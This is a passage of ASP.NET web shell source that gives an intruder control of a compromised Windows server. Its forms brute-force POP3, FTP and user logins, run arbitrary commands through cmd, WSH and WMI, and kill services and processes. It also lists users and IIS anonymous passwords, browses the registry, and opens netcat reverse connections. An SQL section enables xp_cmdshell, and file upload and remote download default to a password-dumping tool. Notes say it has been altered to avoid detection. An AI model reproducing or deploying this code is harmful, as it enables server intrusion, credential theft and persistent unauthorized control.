  <p>- This function has fixed by Nido has not detected (2009/03/27)-</p>
  <p>
      POP3 Domain:
      <asp:TextBox ID="POP3Domain" runat="server" style="width:150px;" class="TextBox" Text="82.80.250.146"/>&nbsp; &nbsp; &nbsp;
      <asp:checkbox id="POP3CheckBoxPeer" runat="server" Checked="True" Text="Peer" ></asp:checkbox>&nbsp; &nbsp; &nbsp; &nbsp; 
      Concatenation User:&nbsp;
      <asp:TextBox ID="TextBox4" runat="server" Width="107px" class="TextBox" />&nbsp;&nbsp;
      <asp:CheckBox ID="CheckBox3" runat="server" Text="Dash Split" /><br />
      password:&nbsp;
      <asp:TextBox ID="POP3Password" runat="server" style="width:150px;" class="TextBox" Text="1q2w3e4r"/>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="POP3CheckBoxAtHomeUser" runat="server" Text="AtHome" />
      &nbsp;&nbsp; Concatenation Pass: &nbsp;<asp:TextBox ID="POP3Concat" runat="server" Width="107px" class="TextBox" Text="123"/>
      &nbsp;&nbsp;
      <asp:CheckBox ID="CheckBox5" runat="server" Text="Reverse Password" /><br />
      Remove:&nbsp; &nbsp; 
      <asp:TextBox ID="TextBox7" runat="server" style="width:150px;" class="TextBox" Text="."></asp:TextBox>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="CheckBox6" runat="server" Text="From String" />&nbsp;
      <asp:Button ID="ButtonPOP3Brute" runat="server" Text="Start" OnClick="RunPOP3Brute" class="buttom"/> </p>
  <p>
   <asp:Label ID="resultPOP3Brute" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "FtpBrute"
%>
<form id="FormFtpBrute" runat="server">
  <p>[ Ftp Brute &nbsp;for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Ftp Brute with ASP.NET account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
  <p>- This function has fixed by Nido has not detected (2009/03/27)-</p>
  <p>
  User from:
  <asp:DropDownList ID="DropDownListReverseIp" runat="server">
          <asp:ListItem Value="www.whosonmyserver.com"></asp:ListItem>
          <asp:ListItem Value="www.my-ip-neighbors.com"></asp:ListItem>
          <asp:ListItem Value="localhost"></asp:ListItem>
          <asp:ListItem Value="domain.txt"></asp:ListItem>
      </asp:DropDownList>
      <asp:checkbox id="CheckBoxRemotlyBrute" runat="server" Text="Remotly Server" ></asp:checkbox>
	  User Name: &nbsp; &nbsp;
      <asp:TextBox ID="TextBoxNameBrute" runat="server" style="width:150px;" class="TextBox"/>
	  User Password: &nbsp; &nbsp;
      <asp:TextBox ID="TextBoxPasswordBrute" runat="server" style="width:150px;" class="TextBox"/>
      </p>
      ip address:
      <asp:TextBox ID="IpAddress" runat="server" style="width:150px;" class="TextBox" Text="127.0.0.1"/>&nbsp; &nbsp; &nbsp;
      <asp:checkbox id="CheckBoxPeer" runat="server" Text="Peer" ></asp:checkbox>&nbsp; &nbsp; &nbsp; &nbsp; 
      Concatenation User:&nbsp;
      <asp:TextBox ID="ConcatUser" runat="server" Width="107px" class="TextBox" />&nbsp;&nbsp;
      <asp:CheckBox ID="CheckDashSplit" runat="server" Text="Dash Split" /><br />
      password:&nbsp;
      <asp:TextBox ID="CheckPassword" runat="server" style="width:150px;" class="TextBox" Text="1q2w3e4r"/>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="CheckBoxAtHomeUser" runat="server" Text="AtHome" />
      &nbsp;&nbsp; Concatenation Pass: &nbsp;<asp:TextBox ID="Concat" runat="server" Width="107px" class="TextBox" Text="123"/>
      &nbsp;&nbsp;
      <asp:CheckBox ID="CheckBoxReverseFtp" runat="server" Text="Reverse Password" /><br />
      Remove:&nbsp; &nbsp; 
      <asp:TextBox ID="CheckRemove" runat="server" style="width:150px;" class="TextBox" Text="."></asp:TextBox>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="CheckBoxRemove" runat="server" Text="From String" />&nbsp;
      <asp:Button ID="ButtonFtpBrute" runat="server" Text="Start" OnClick="RunFtpBrute" class="buttom"/> </p>
  <p>
   <asp:Label ID="resultFtpBrute" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "localgroup"
%>
<form id="Form5" runat="server">
  <p>[ local group  for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> local group with ASP.NET account(<span class="style3">Notice: only click "Start" to start Enumerating</span>)</p>
  <p>- This function has fixed by Tatra has not detected (2009/04/17)-</p>
  <p>
      Select Group:&nbsp; 
     <asp:DropDownList id="lb1local" runat="server"></asp:DropDownList>
     <asp:Button ID="ButtonLocalGroupUser" runat="server" Text="Start" OnClick="LocalGroupUser" class="buttom"/>  
  </p>
  <p>
   <asp:Label ID="resultLocalGroupUser" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "UserEnumLogin"
%>
   <form id="FormUserEnumLogin" runat="server">
  <p>[ User Enum Login  for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a><br />
  </i> User Enum Login with ASP.NET account(<span class="style3">Notice: only click "Start" to start brute</span>)<br />
      - This function has fixed by Tatra has not detected (2009/04/17)-</p>
    <p>
<table width="100%"  border="0" align="left" dir="ltr">
  <tr>
    <td style="width: 12%">
        Domain / Ip / File.ini</td>
    <td style="width: 10%"><asp:TextBox ID="DomaineName" runat="server" Width="170px" class="TextBox" Text="127.0.0.1"/></td>
      <td style="width: 11%">
      <asp:checkbox id="CheckBoxRemotlyServer" runat="server" Text="Remotly Server" ></asp:checkbox>
      </td>
      <td style="width: 20%">
          User : &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
          <asp:TextBox ID="UserNameRemotly" runat="server" Width="170px" class="TextBox"/></td>
      <td style="width: 16%">
          Pass :<asp:TextBox ID="UserPassword" runat="server" Width="170px" class="TextBox"/></td>
  </tr>
    <tr>
        <td style="width: 12%; height: 26px;">
            Password</td>
        <td style="width: 10%; height: 26px;">
            <asp:TextBox ID="CheckPasswordUser" runat="server" Width="170px" class="TextBox" Text="1q2w3e4r" /></td>
        <td style="width: 11%; height: 26px;">
        <asp:checkbox id="CheckBoxAtHome" runat="server" Text="At Home" ></asp:checkbox>
            </td>
        <td style="width: 20%; height: 26px;">
            Add To Name:<asp:TextBox ID="ConcatPasswordUser" runat="server" Width="170px" class="TextBox" Text="123"/></td>
        <td style="width: 16%; height: 26px;">
            </td>
    </tr>
    <tr>
        <td style="width: 12%; height: 26px">
            Remove
        </td>
        <td style="width: 10%; height: 26px">
            <asp:TextBox ID="RemoveStringPassword" runat="server" Width="170px" class="TextBox" Text="ftp" /></td>
        <td style="width: 11%; height: 26px">
        <asp:checkbox id="CheckRemovestring" runat="server" Text="Remove String" ></asp:checkbox>
        </td>
        <td style="width: 20%; height: 26px">
        <asp:CheckBox ID="CheckBoxReverse" runat="server" Text="Reverse Password" />
        </td>
        <td style="width: 16%; height: 26px">
<asp:Button ID="ButtonUserEnumLogin" runat="server" Text="Start" OnClick="RunUserEnumLogin" class="buttom"/></td>
    </tr>
</table>
    </p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>
   <asp:Label ID="resultUserEnumLogin" runat="server" style="style2"/>      
    </p>
</form>
<%
	case "cmd"
%>
<form id="Formcmd" runat="server">
  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Execute command with ASP.NET account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  Command:
  <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
  <p>
   <asp:Label ID="result" runat="server" style="style2"/>
   </p>
</form>
<%
	case "cmdw32"
%>
<form id="Formw32" runat="server">
	<p>[ ASP.NET W32 Shell ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	<p> Execute command with ASP.NET account using W32(<span class="style3">Notice: only click "Run" to run</span>)</p>
  	Command:
	<asp:TextBox ID="txtCommand1" runat="server" Width="300" class="TextBox" />
  	<asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" class="buttom"/>
  	<p>
    <asp:Label ID="resultcmdw32" runat="server" style="style2"/>
    </p>
</form>
<%
	case "cmdwsh"
%>
<form id="Formwsh" runat="server">
	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	<p> Execute command with ASP.NET account using WSH(<span class="style3">Notice: only click "Run" to run</span>)</p>
  	Command:
	<asp:TextBox ID="txtCommand2" runat="server" Width="300" class="TextBox" />
  	<asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" class="buttom"/>
  	<p>
    <asp:Label ID="resultcmdwsh" runat="server" style="style2"/>
    </p>
</form>
<%
Case "cmdwmi"
%>
<form id="Formwmi" runat="server">
	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	<p> Execute command with ASP.NET account using WMI(<span class="style3">Notice: only click "Run" to run</span>)</p>
  	Command:
	<asp:TextBox ID="txtCommand3" runat="server" Width="300" class="TextBox" />
  	<asp:Button ID="Buttoncmdwmi" runat="server" Text="Run" OnClick="RunCmdWMI"  class="buttom"/>
  	<p>
    <asp:Label ID="resultcmdwmi" runat="server" style="style2"/>
    </p>
</form>
<% 
Case "change"
    Dim status As String
    status = Request.QueryString("status")
   ' Dim Service As String
    Service = Request.QueryString("src")
    Dim winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Select Case status
        Case "Start"
            Dim objNetDDEService = winObj.Get("Win32_Service.Name='" & Service & "'")
            objNetDDEService.StartService()
            Response.Write("<script>alert(""Service " & Service & " Start!"");location.href='" & Request.ServerVariables("URL") & "?action=srv" & "'</script>")
        Case "Stop"
            Dim objNetDDEService = winObj.Get("Win32_Service.Name='" & Service & "'")
            objNetDDEService.StopService()
            Response.Write("<script>alert(""Service " & Service & " Stop!"");location.href='" & Request.ServerVariables("URL") & "?action=srv" & "'</script>")
        Case "Pause"
            Dim objNetDDEService = winObj.Get("Win32_Service.Name='" & Service & "'")
            objNetDDEService.PauseService()
            Response.Write("<script>alert(""Service " & Service & " Pause!"");location.href='" & Request.ServerVariables("URL") & "?action=srv" & "'</script>")
        Case "Resume"
            Dim objNetDDEService = winObj.Get("Win32_Service.Name='" & Service & "'")
            objNetDDEService.ResumeService()
            Response.Write("<script>alert(""Service " & Service & " Resume!"");location.href='" & Request.ServerVariables("URL") & "?action=srv" & "'</script>")
        Case "LogOnAs"
           %>
             <form id="FormLogOnAs" runat="server">
             <asp:RadioButtonList ID="RadioListUser" runat="server">
                 <asp:ListItem Selected="True">LocalSystem</asp:ListItem>
                 <asp:ListItem>NT AUTHORITY\NetworkService</asp:ListItem>
                 <asp:ListItem>This account</asp:ListItem>
             </asp:RadioButtonList>
             UserName:
             <asp:TextBox ID="LAname" runat="server" style="width:150px;" CssClass="TextBox" Text=".\Administrator"/>
             
             Password:
             <asp:TextBox ID="LApass" runat="server" style="width:150px;" CssClass="TextBox" Text="12345678"/>
             <asp:Button ID="ButLogOnAs" runat="server" Text="Change" OnClick="RunLogOnAs" CssClass="buttom"/>
             <input name="NameLogOnAs" type="hidden" value="<%=Service%>"/>         
             </form>
           <%
        Case "kill"
            If Service.IndexOf(".") <> -1 Then
                Service = Service.Substring(0, Service.IndexOf("."))
            End If
            KillProByName(Service)
            Response.Write("<script>alert(""Process " & Service & " KILL!"");location.href='" & Request.ServerVariables("URL") & "?action=pro" & "'</script>")
    End Select
%>
<%
Case "GoUrl"
    Dim sURL As String
    sURL = Request.QueryString("src")
    Dim objNewRequest As WebRequest = HttpWebRequest.Create(sURL)
    Dim objResponse As WebResponse = objNewRequest.GetResponse
    Dim objStream As New StreamReader(objResponse.GetResponseStream())
    Dim myDatabuffer As String = objStream.ReadToEnd()
    Do While myDatabuffer.IndexOf("href=") <> -1
        Response.Write(myDatabuffer.Substring(0, myDatabuffer.IndexOf("href=") + 6))
        myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf("href=") + 5)
        Dim website As String = myDatabuffer.Substring(1, myDatabuffer.IndexOf(">") - 2)
        If myDatabuffer.IndexOf("http=") <> -1 Then
            Response.Write(Request.ServerVariables("URL") & "?action=GoUrl&src=" & website)
        Else
            Response.Write(Request.ServerVariables("URL") & "?action=GoUrl&src=" & sURL & website)
        End If
        myDatabuffer = myDatabuffer.Substring(myDatabuffer.IndexOf(">") - 2)
    Loop
    Response.Write(myDatabuffer)

%>
<%
Case "srv"
%>
<form id="Formsrv" runat="server">
	<p align=center>[ List processes from server ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td> 
			<% 
			    Try
			        output_wmi_function_data("Win32_Service", "Name,PathName,State,StartMode,StartName", "Start,Stop,Pause,Resume,LogOnAs", ht, us, pa)
			    Catch ex As Exception
			        rw("This function is disabled by server<br>")
			        rw(ex.Message)
			    End Try
	        %>
			</td>
		</tr>
	</table>
</form>
<%
	case "pro"
%>
<form id="Formpro" runat="server">
	<p align=center>[ List processes from server ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
			    Try
			        output_wmi_function_data("Win32_Process", "Name,ProcessId,WorkingSetSize,HandleCount,CommandLine", "kill", ht, us, pa)
			    Catch
			        Try
			            Dim mypro As Process() = Process.GetProcesses()
			            table("0", "", "")
			            Create_table_row_with_supplied_colors("black", "white", "center", "ID,Process,MemorySize,Threads,User Name")
			            For Each p As Process In mypro
			                tr()
			                Surround_by_TD(center_(p.Id.ToString()))
			                Surround_by_TD(center_(p.ProcessName.ToString()))
			                Surround_by_TD(center_(p.WorkingSet.ToString()))
			                Surround_by_TD(center_(p.Threads.Count.ToString()))
			                Surround_by_TD(center_("<a href='?action=change&status=kill&src=" & p.ProcessName.ToString() & "'" & " onclick='return del(this);'>Kill</a>"))
			                _tr()
			            Next
			        Catch ex As Exception
			            rw("This function is disabled by server")
			            rw(ex.Message)
			        End Try
			    End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
Case "RvConnect"
    url = Request.QueryString("src")
%>
<form id="FormRvConnect" runat="server">
  <p>[ Rv Connect for WebAdmin ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i><br />
  - example: (using netcat) run "nc -l -p 6666" and then press Connect<br />
  - example: (using netcat) Check "Listen" and then run "nc ip 6666"</p>
  	IP Client:
    <asp:TextBox ID="IpRvConnect" runat="server" style="width:150px;" Text="192.168.0.110" CssClass="TextBox" />
    Port:
    <asp:TextBox ID="PortRvConnect" runat="server" style="width:150px;" CssClass="TextBox" Text="6666"/>
    <asp:CheckBox ID="CheckBoxListen" runat="server" Text="Listen" />
    <asp:Button ID="ButtonRvConnect" runat="server" Text="Connect" OnClick="RunRvConnect" CssClass="buttom"/>      
    <input name="PathRvConnect" type="hidden" value="<%=url%>"/>
    <p>
    <asp:Label ID="LabelRvConnect" runat="server" style="style2"/>
    </p>
</form>
<%
Case "FtpSwitch"
%>
<form id="FormFtpSwitch" runat="server">
	<p align=center>[ Ftp Switch ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	Ftp Server:
    <asp:TextBox ID="ftpServerIP" runat="server" style="width:150px;" class="TextBox" Text="192.168.0.21"/>
    User Name:
    <asp:TextBox ID="ftpUserID" runat="server" style="width:150px;" class="TextBox" Text="usaername"/>
    User Password:
    <asp:TextBox ID="ftpPassword" runat="server" style="width:150px;" class="TextBox" Text="password"/>
    <asp:TextBox ID="ftproot" runat="server" style="width:150px;" class="TextBox" Text="/"/>
    <asp:Button ID="ButtonftpConnect" runat="server" Text="Connect" OnClick="RunftpConnect" class="buttom"/>      
    <p>
   <asp:Label ID="LabelFtpSwitch" runat="server" style="style2"/>      </p>
</form>
<%
Case "GetNTPC"
%>
<form id="FormNTPC" runat="server">
	<p align=center>[ Network Computers ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
     			<% 
     			    table("1", "", "")
     			    Create_table_row_with_supplied_colors("black", "white", "center", "ID,Server,Ip")
     			    Dim NetViewEnum As ArrayList = GetNetViewEnumUseNetapi32()
     			    Dim i As Integer = 1
     			    For Each NetView As String In NetViewEnum
     			        Try
     			            Dim hostInfo As IPHostEntry = Dns.GetHostByName(NetView)
     			            Dim ip_addrs As IPAddress() = hostInfo.AddressList
     			            For Each ip As IPAddress In ip_addrs
     			                tr()
     			                Surround_by_TD(center_(i))
     			                Surround_by_TD(center_(NetView))
     			                Surround_by_TD(center_(ip.ToString()))
     			                _tr()
     			            Next
     			        Catch
     			            tr()
     			            Surround_by_TD(center_(i))
     			            Surround_by_TD(center_(NetView))
     			            Surround_by_TD(center_("Not Found"))
     			            _tr()
     			        End Try
     			        i = i + 1
     			    Next
     			    _table()
			%>		
			</td>
		</tr>
	</table>	
</form>
<%
Case "homedirectory"
%>
<form id="FormHD" runat="server">
	<p align=center>[ Home Directory Accounts ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
			response.Write(ht & "<br>")
			response.Write(us & "<br>")
			response.Write(pa & "<br>")
			    table("1", "", "")
			    Dim oIADs, lastlogin, Passwordlastset, oScriptNet, oContainer
			    If ht <> "" Then
			        oScriptNet = GetObject("WinNT:")
			        oContainer = oScriptNet.OpenDSObject("WinNT://" & ht & "", us, pa, 0)
			    Else
			        oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
			        oContainer = GetObject("WinNT://" & oScriptNet.ComputerName & "")
			    End If
			    Create_table_row_with_supplied_colors("black", "white", "center", "Name,HomeDirectory,lastlogin,Passwordlastset")
			    For Each oIADs In oContainer
			        If (oIADs.Class = "User") Then
			            Try
			                lastlogin = oIADs.lastlogin.ToString()
			            Catch
			                lastlogin = "Never"
			            End Try
			            Passwordlastset = DateAdd("s", -oIADs.PasswordAge, Now())
			            tr()
			            Surround_by_TD(center_(oIADs.Name))
			            Surround_by_TD(center_(oIADs.HomeDirectory))
			            Surround_by_TD(center_(lastlogin))
			            Surround_by_TD(center_(FormatDateTime(Passwordlastset, 1).ToString() + "," + FormatDateTime(Passwordlastset, 3).ToString()))
			            _tr()
			        End If
			    Next
			%>
			</td>
		</tr>
	</table>
</form>

<%
	case "user"
%>
<form id="Form10" runat="server">
	<p align=center>[ List User Accounts ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_UserAccount"		
				dim Fields_to_load = "Name,Domain,FullName,Description,PasswordRequired,SID"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
			        output_wmi_function_data(WMI_function, Fields_to_load, "", ht, us, pa)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "applog"
%>
<form id="FormApp" runat="server">
	<p align=center>[ List Application Event Log Entries ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
			    Dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"
				dim Fields_to_load = "Logfile,Message,type"
			    Dim fail_description = " Access to " + WMI_function + " is protected"
				Try
			        Wmi_InstancesOf(WMI_function, Fields_to_load, 2000, "winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
				Catch
			        rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "syslog"
%>
<form id="FormLog" runat="server">
	<p align=center>[ List System Event Log Entries ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				
				Try
			        Wmi_InstancesOf(WMI_function, Fields_to_load, 2000, "winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
				Catch
				rw("This function is disabled by server")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "auser"
%>
<form id="Form14" runat="server">
	<p align=center>[ IIS List Anonymous ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
			    Dim WMI_function = "IIsWebVirtualDirSetting"
			    Dim Fields_to_load = "AppFriendlyName,AppPoolId,AnonymousUserName,AnonymousUserPass"
			    Dim fail_description = " Access to " + WMI_function + " is protected"
				Try
			        Wmi_InstancesOf(WMI_function, Fields_to_load, 2000, "winmgmts:{impersonationLevel=impersonate}!\\.\root\microsoftIISv2")
				Catch
			        rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "ipconfig"
%>
<form id="FormIpcon" runat="server">
	<p align=center>[ Ip Config ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 			
			    ' Dim res As String = GetRunCMD("ipconfig /all")
			    '  If res <> "This function has disabled!" Then
			    ' rw("<pre><b>" & res & "</b></pre>")
			    ' Else
			    Try
			        Dim objProcessInfo, winObj, objItem
			        winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
			        objProcessInfo = winObj.ExecQuery("Select * from Win32_NetworkAdapterConfiguration WHERE IPEnabled = 'TRUE'")
			        For Each objItem In objProcessInfo
			            rw("Caption: " & objItem.Caption & "<br>")
			            rw("DHCPEnabled: " & objItem.DHCPEnabled & "<br>")
			            rw("DHCPServer: " & objItem.DHCPServer & "<br>")
			            rw("DNSDomain: " & objItem.DNSDomain & "<br>")
			            rw("DNSHostName: " & objItem.DNSHostName & "<br>")
			            If objItem.IPAddress Is Nothing Then
			                rw("IPAddress: " & "<br>")
			            Else
			                rw("IPAddress: " & Join(objItem.IPAddress, ",") & "<br>")
			            End If
			            If objItem.IPSubnet Is Nothing Then
			                rw("IPSubnet: " & "<br>")
			            Else
			                rw("IPSubnet: " & Join(objItem.IPSubnet, ",") & "<br>")
			            End If
			            rw("MACAddress: " & objItem.MACAddress & "<br>")
			        Next
			        
			    Catch ex As Exception
			        'rw("This function is disabled by server")
			        rw(ex.Message)
			    End Try
			    '  End If
			    ' Try
			    'Response.Write("<pre><b>" & GetRunCMD("ipconfig /all") & "</b></pre>")
			    '  Catch
			    'rw("This function is disabled by server")
			    ' End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "sqlrootkit"
%>
<form id="Formsqlrootkit" runat="server">
  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a><br />
  </i> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
        <p>
            To enable XP_CmdShell Chek Sql query and using the following command<br />
            Exec Master.dbo.Sp_Configure 'Show Advanced Options', 1<br />
            Reconfigure<br />
            Exec Master.dbo.Sp_Configure 'XP_CmdShell', 1<br />
            Reconfigure<br />
            Host:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox ID="ip" runat="server" class="TextBox" Text="127.0.0.1" style="width:150px;"/></p>
  <p>
  SQL Name:
    <asp:TextBox ID="SqlName" runat="server" style="width:150px;" class="TextBox" Text="sa"/>
  SQL Password:
    <asp:TextBox ID="SqlPass" runat="server" style="width:150px;" class="TextBox" Text="Sj60IxnpP70O"/>
    <asp:CheckBox ID="CheckBoxWinInt" runat="server" Text="Windows Integrated Security" />
  </p>
  Command:
  <asp:TextBox ID="Sqlcmd" runat="server" style="width:407px;" class="TextBox"/>
  <asp:CheckBox ID="Sqlqurey" runat="server" Text="Sql qurey" />
  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
  <p>
   <asp:Label ID="resultSQL" runat="server" style="style2"/></p>
</form>

<%
Case "regshell"
    Dim subkey As String = ""
    If Request.QueryString("key") <> "" Then
        subkey = Request.QueryString("key") & "\"
    End If
    If Request.QueryString("Computer") <> "" Then
        Computer = Request.QueryString("Computer")
    Else
        Computer = "HKEY_LOCAL_MACHINE"
    End If
    
%>
<table width="100%"  border="0" align="center">
  <tr>
  	<td>My Computer:</td> <td><font color=red>
  	<%
  	    Dim res As String = subkey
  	    Dim NtPc As String = ""
  	    Do While res.IndexOf("\") <> -1
  	        NtPc &= res.Substring(0, res.IndexOf("\") + 1)
  	        Dim NtPc1 As String = res.Substring(0, res.IndexOf("\"))
  	        res = res.Substring(res.IndexOf("\") + 1)
  	        rw("<a href='?action=regshell&Computer=" & Computer & "&key=" & NtPc.Trim() & "'>" & NtPc1.Trim() & "</a>\")
  	    Loop
    %>
  	</font></td>
  </tr>
  <tr> 
    <td>Go to: </td>
    <td>
        <%
            rw("<a href='?action=regshell&Computer=HKEY_LOCAL_MACHINE '>HKEY_LOCAL_MACHINE</a> - ")
            rw("<a href='?action=regshell&Computer=HKEY_CLASSES_ROOT '>HKEY_CLASSES_ROOT</a> - ")
            rw("<a href='?action=regshell&Computer=HKEY_CURRENT_USER '>HKEY_CURRENT_USER</a> - ")
            rw("<a href='?action=regshell&Computer=HKEY_USERS '>HKEY_USERS</a> - ")
            rw("<a href='?action=regshell&Computer=HKEY_CURRENT_CONFIG '>HKEY_CURRENT_CONFIG</a>")
        %> 
    </td>
  </tr>
  </table>
  <hr>
<table width="100%"  border="1" align="center">
	<tr>
	<td width="20%"><strong>My Computer</strong></td>
	<td width="70%"><strong>Operate</strong></td>
	</tr>
                <%
                    Dim rk As RegistryKey = Nothing
                    Dim subrk As String() = {""}
                    Dim valuerk As String() = {""}     
                    Select Case Computer
                        Case "HKEY_LOCAL_MACHINE"
                            rk = Registry.LocalMachine
                        Case "HKEY_CLASSES_ROOT"
                            rk = Registry.ClassesRoot
                        Case "HKEY_CURRENT_USER"
                            rk = Registry.CurrentUser
                        Case "HKEY_USERS"
                            rk = Registry.Users
                        Case Else
                            rk = Registry.CurrentConfig
                    End Select
                    subrk = rk.OpenSubKey(subkey).GetSubKeyNames()
                    valuerk = rk.OpenSubKey(subkey).GetValueNames()
                  For Each subKeysKey As String In subrk
                        rw("<tr><td><a href='?action=regshell&Computer=" & Computer & "&key=" & subkey & subKeysKey & "'>" & subKeysKey & "</a></td>")
                        rw("</tr>")
                  Next
                  For Each subKeysValue As String In valuerk
                      Dim data As Object = rk.OpenSubKey(subkey).GetValue(subKeysValue)
                        rw("<tr><td>" & subKeysValue & "</td>")
                        rw("<td>" & data.GetType().FullName & "</td><td>")
                      For Each resdata As String In RegistryReadValue(data)
                            rw(resdata & " ")
                      Next
                        rw("</td></tr>")
                  Next
             %>    
  </table>
<%
	case "DbManager"
%>
<form id="FormDbManager" runat="server">
  <p>[ Data Base Manager for CaterPillar ]&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Select command with Data Base Manager account(<span class="style3">Notice: only click "Connect" to Connect</span>)</p>
  <p>Host Name:<asp:TextBox ID="DbServerName" runat="server" style="width:200px;" class="TextBox" Text="127.0.0.1"/>
     Database:<asp:TextBox ID="DbDatabase" runat="server" style="width:454px;" class="TextBox" Text="DataBase"/></p>  
  <p>User Name:<asp:TextBox ID="DbUserName" runat="server" style="width:200px;" class="TextBox" Text="sa"/>
     Password:<asp:TextBox ID="DbPass" runat="server" style="width:200px;" class="TextBox" Text="Sj60IxnpP70O"/>
     Driver:<asp:DropDownList ID="DropDownDriver" runat="server">
          <asp:ListItem Value="Microsoft.Jet.OLEDB.4.0"></asp:ListItem>
          <asp:ListItem Value="SQL Server"></asp:ListItem>
          <asp:ListItem Value="MySQL ODBC 3.51 Driver"></asp:ListItem>
          <asp:ListItem Value="Oracle ODBC Driver"></asp:ListItem>
      </asp:DropDownList></p>
  <p>Connection String:<asp:TextBox ID="DbManagerTable" runat="server" style="width:500px;" class="TextBox"/>
  <asp:Button ID="ButtonDbManager" runat="server" Text="Connect" OnClick="RunDbManager" class="buttom"/></p>
  <p><asp:Label ID="LabelDbManager" runat="server" style="style2"/></p>
</form>
<%
	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
%>
<form id="UpLoadFile" name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
 You will upload file to this directory : <span class="style3"><%=url%></span><br>
 Please choose file from your computer :
 <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
 <asp:Button ID="UpFileSubit" Text="Submit" runat="server" CssClass="buttom"  OnClick="UpLoad"/>  
 <input name="SaveAsPath" type="hidden" value="<%=url%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
<%
Case "downloadfileRemote"
    url = Request.QueryString("src")
%>
<form id="FormDownloadFile" name="DownloadFileForm" runat="server">
 You will download file to this directory : <span class="style3"><%=url%></span><br>
 Please choose file from server :
 <asp:TextBox ID="downloadfileRemote" runat="server" style="width:350px;" class="TextBox" Text="http://swamp.foofus.net/fizzgig/fgdump/fgdump-2.1.0.zip"/>
 Save As File :
